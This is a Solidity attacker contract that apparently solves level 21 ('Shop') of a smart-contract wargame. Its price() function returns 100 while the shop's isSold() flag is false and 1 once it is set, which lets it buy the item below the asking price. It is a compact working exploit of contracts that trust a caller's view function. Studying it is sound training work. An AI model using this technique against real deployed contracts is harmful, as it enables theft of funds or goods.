// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../LevelsContracts/#21 Shop.sol';

contract ShopHack {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 1 : 100;
  }

  function hack (Shop _victim) external {
    Shop(_victim).buy();
  }
}
